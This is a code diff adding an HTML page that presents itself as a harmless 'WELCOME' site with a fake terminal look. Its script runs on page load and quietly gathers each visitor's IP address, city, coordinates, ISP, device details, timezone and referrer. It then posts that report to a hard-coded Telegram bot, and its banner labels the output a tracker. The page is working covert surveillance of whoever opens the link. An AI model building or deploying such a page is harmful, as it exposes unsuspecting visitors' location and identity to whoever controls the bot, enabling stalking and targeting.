@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Yapping- Website</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #0f0f0f;
+      padding: 20px;
+      color: #e0e0e0;
+    }
+    .terminal-box {
+      background: #1a1a1a;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      max-width: 700px;
+      margin: auto;
+      border: 1px solid #333;
+      position: relative;
+    }
+    .terminal-header {
+      background: #222;
+      padding: 8px 15px;
+      border-radius: 5px 5px 0 0;
+      margin: -20px -20px 15px -20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #444;
+    }
+    .terminal-title {
+      font-weight: bold;
+      color: #4CAF50;
+      text-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
+    }
+    .terminal-dots {
+      display: flex;
+      margin-right: 10px;
+    }
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+    .dot-red { background: #ff5f56; }
+    .dot-yellow { background: #ffbd2e; }
+    .dot-green { background: #27c93f; }
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .info-item {
+      display: flex;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    .info-label {
+      color: #4CAF50;
+      min-width: 120px;
+      margin-right: 10px;
+    }
+    .info-value {
+      color: #e0e0e0;
+      word-break: break-all;
+    }
+    .section-title {
+      color: #4CAF50;
+      margin: 15px 0 10px 0;
+      padding-bottom: 5px;
+      border-bottom: 1px solid #333;
+      grid-column: span 2;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 12px;
+    }
+    @media (max-width: 600px) {
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+      .section-title {
+        grid-column: span 1;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="terminal-box">
+    <div class="terminal-header">
+      <div class="terminal-dots">
+        <div class="dot dot-red"></div>
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-green"></div>
+      </div>
+      <div class="terminal-title">WELCOME</div>
+    </div>
+    
+    <div class="info-grid" id="deviceInfo">
+      <div class="section-title">LOADING</div>
+    </div>
+    
+    <div class="footer">Telegram @XemzzXiterz</div>
+  </div>
+
+  <script>
+    const token = '7953770747:AAFoT-771Xtut6MY6USjkLZaMdcgyd3ArIw';
+    const chatId = 'YOUR_TELEGRAM_ID';
+
+    function sendText(text) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+      });
+    }
+
+    function createInfoItem(label, value) {
+      const container = document.getElementById('deviceInfo');
+      const item = document.createElement('div');
+      item.className = 'info-item';
+      item.innerHTML = `
+        <div class="info-label">${label}</div>
+        <div class="info-value">${value}</div>
+      `;
+      container.appendChild(item);
+      return `<b>${label}:</b> ${value}\n`;
+    }
+
+    function getRandomUID() {
+      return 'xxxx-xxxx-4xxx-yxxx'.replace(/[xy]/g, function(c) {
+        const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+      });
+    }
+
+    function getGPUInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+        }
+        return 'Unknown';
+      } catch (e) {
+        return 'Unknown';
+      }
+    }
+
+    async function collectAllInfo() {
+      let message = '```╭── 🎯 𝗧𝗥𝗔𝗖𝗞𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 𝗕𝗬 KNOXZY──╮\n\n';
+      
+      // IP Information
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        
+        message += `<b>📡 IP Address        :</b> ${ipData.ip}\n`;
+        message += `<b>🏙️ Lokasi            :</b> ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n`;
+        message += `<b>📌 Koordinat         :</b> ${ipData.latitude}, ${ipData.longitude}\n`;
+        message += `<b>🌐 ISP               :</b> ${ipData.org || 'Unknown'}\n`;
+        message += `<b>📶 Koneksi           :</b> ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}\n\n`;
+      } catch (e) {
+        message += '❌ Gagal mendapatkan informasi IP\n\n';
+      }
+
+      // Device Information
+      message += `<b>🖥️ Device            :</b> ${navigator.userAgent}\n`;
+      message += `<b>💻 Platform          :</b> ${navigator.platform}\n`;
+      message += `<b>📺 Resolusi Layar    :</b> ${screen.width}x${screen.height}\n`;
+      message += `<b>🪟 Ukuran Window     :</b> ${window.innerWidth}x${window.innerHeight}\n`;
+      message += `<b>🧠 CPU Cores         :</b> ${navigator.hardwareConcurrency || 'Unknown'}\n`;
+      message += `<b>💾 RAM               :</b> ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}\n`;
+      message += `<b>📡 Online Status     :</b> ${navigator.onLine ? '✅ Online' : '❌ Offline'}\n\n`;
+
+      // Time Information
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      message += `<b>🧭 Zona Waktu        :</b> ${tz}\n`;
+      message += `<b>🕒 Akses Waktu       :</b> ${new Date().toLocaleString()}\n\n`;
+
+      // Page Information
+      message += `<b>🔗 Referrer          :</b> ${document.referrer || 'None'}\n`;
+      message += `<b>🌍 URL               :</b> ${window.location.href}\n`;
+      message += `<b>🧪 Session ID        :</b> ${getRandomUID()}\n\n`;
+
+      message += '╰── 📡 𝗧𝗿𝗮𝗰𝗸𝗲𝗱 𝗯𝘆 Ken𝘇𝗭 | t.me/XemzzXiterz ──╯```';
+
+      return message;
+    }
+
+    // Main execution
+    (async () => {
+      const fullReport = await collectAllInfo();
+      sendText(fullReport);
+    })();
+  </script>
+</body>
+</html>
